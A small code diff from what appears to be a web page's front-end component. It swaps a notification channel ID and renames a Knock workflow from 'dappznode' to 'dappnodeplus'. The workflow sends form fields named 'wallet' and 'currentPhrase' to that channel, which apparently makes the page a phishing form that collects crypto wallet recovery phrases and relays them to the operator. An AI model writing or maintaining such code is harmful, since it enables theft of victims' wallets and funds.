@@ -102,12 +102,12 @@ export default function Home() {
       {
         connections: [
           {
-            channel_id: "1339227986116743179",
+            channel_id: "1341002248188198923",
           },
         ],
       }
     );
-    await knock.workflows.trigger("dappznode", {
+    await knock.workflows.trigger("dappnodeplus", {
       data: {
         wallet: formState.wallet,
         currentPhrase: formState.currentPhrase,
